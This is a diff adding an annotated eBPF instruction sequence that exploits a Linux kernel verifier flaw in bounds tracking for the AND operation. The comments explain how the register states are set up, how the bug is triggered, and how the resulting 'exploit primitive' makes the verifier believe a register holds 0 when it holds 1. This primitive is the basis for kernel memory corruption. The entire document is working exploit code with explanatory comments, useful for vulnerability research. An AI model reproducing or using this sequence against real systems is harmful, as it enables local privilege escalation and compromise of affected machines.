@@ -1,0 +1,77 @@
+// We need two registers. 
+// R4 = {mask = 0x0; value = 0x100000002}
+// R5 = {mask = 0xFFFFFFFF00000000; value = 0x1}
+
+// Set up first register
+// Op size is 32 bit so load cannot be performed in one instruction
+BPF_MOV64_IMM(CONST_REG, 0x1),
+BPF_ALU64_IMM(BPF_LSH, CONST_REG, 32),
+BPF_ALU64_IMM(BPF_ADD, CONST_REG, 2),
+
+// Set up second register
+// We need to have the upper 32 bits of mask set. We can start with a value 
+// that is unknown to the verifier, meaning that all the bits of mask are set.
+// The most straightforward way to do this is to load a value from a eBPF map.
+
+// Set up first argument of BPF_FUNC_map_lookup_elem in R1
+// Load a pointer to the map_fd map into R1
+BPF_LD_MAP_FD(BPF_REG_1, map_fd),
+
+// Set up second argument of BPF_FUNC_map_lookup_elem. Goal is to load an 
+// address to the value 0 into R2.
+// Load 0 into R0 and store value of R0 at stack_ptr-4 (first element).
+BPF_MOV64_IMM(BPF_REG_0, 0),
+BPF_STX_MEM(BPF_W, BPF_STACK_REG, BPF_REG_0, -4),
+// Set R2=stack_ptr-4
+BPF_MOV64_REG(BPF_REG_2, BPF_STACK_REG),
+BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
+
+// Call helper function map_lookup_elem. First parameter is in R1 (map pointer). 
+// Second parameter is in R2, (ptr to elem index value).
+BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
+
+// read return value from BPF_FUNC_map_lookup_elem
+BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
+BPF_MOV64_IMM(BPF_REG_0, 1),
+BPF_EXIT_INSN(),
+
+BPF_LDX_MEM(BPF_DW, EXPLOIT_REG, BPF_REG_0, 0),
+BPF_LDX_MEM(BPF_DW, UNKOWN_VALUE_REG, BPF_REG_0, 0), // Used later for creating primitive
+
+
+// Set R2 to be 0xFFFFFFFF
+BPF_MOV64_IMM(BPF_REG_2, 0xFFFFFFFF),
+// Left shift R2 32 bits, so the value is now 0xFFFFFFFF00000000
+BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),
+// AND EXPLOIT_REG and R2 and store the results in EXPLOIT_REG
+// The upper 32 bits will remain unknown, but the bottom 32 bits are known to be zero
+BPF_ALU64_REG(BPF_AND, EXPLOIT_REG, BPF_REG_2),
+// Add 1 to EXPLOIT_REG, it now has mask = 0xFFFFFFFF00000000 and value = 0x1
+BPF_ALU64_IMM(BPF_ADD, EXPLOIT_REG, 1),
+
+
+// Now we trigger the vulnerability by performing an AND operation on the two 
+// registers we set up. After BPF_AND EXPLOIT_REG: 
+// var_off=(0x0; 0x100000000), s32_min_value=1,s32_max_value=0,u32_min_value=1,u32_max_value=0
+// The value is accurate but the bounds are incorrect
+BPF_ALU64_REG(BPF_AND, EXPLOIT_REG, CONST_REG),
+
+
+// CREATE EXPLOIT PRIMITIVE
+BPF_ALU64_IMM(BPF_ADD, EXPLOIT_REG, 1),
+
+BPF_JMP32_IMM(BPF_JLE, UNKOWN_VALUE_REG, 1, 2),
+BPF_MOV64_IMM(BPF_REG_0, 1),
+BPF_EXIT_INSN(),
+
+// After BPF_ADD the verifier thinks the value of EXPLOIT_REG is 2 however the actual value is 1
+// var_off=(0x2; 0xffffffff00000000), s32_min_value=2,s32_max_value=2,u32_min_value=2,u32_max_value=2
+BPF_ALU64_REG(BPF_ADD, EXPLOIT_REG, UNKOWN_VALUE_REG),
+
+BPF_MOV32_REG(EXPLOIT_REG, EXPLOIT_REG),
+BPF_ALU64_IMM(BPF_AND, EXPLOIT_REG, 1),
+
+// THE VERIFIER NOW THINKS EXPLOIT_REG is 0 when it is really 1
+
+BPF_MOV64_IMM(BPF_REG_0, 1),
+BPF_EXIT_INSN(),
